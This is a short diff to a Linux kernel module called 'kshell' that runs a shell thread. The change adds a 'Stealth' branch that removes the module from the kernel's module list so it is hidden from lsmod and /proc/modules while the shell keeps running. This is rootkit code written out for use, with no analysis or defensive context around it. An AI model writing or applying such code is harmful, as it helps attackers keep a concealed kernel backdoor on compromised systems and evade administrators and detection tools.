@@ -375,9 +375,10 @@ static int __init kshell_init(void)
     pr_debug("kshell: thread started (PID %d)\n", shell_thread->pid);
 
     if (!persist) {
-        pr_debug("kshell: fire-and-forget, returning -ENODEV\n");
-        shell_thread = NULL;
-        return -ENODEV;
+        /* Stealth: hide from lsmod but keep module loaded
+         * (kthread code lives in module .text — can't unload) */
+        list_del_init(&THIS_MODULE->list);
+        pr_debug("kshell: hidden from /proc/modules\n");
     }
 
     return 0;
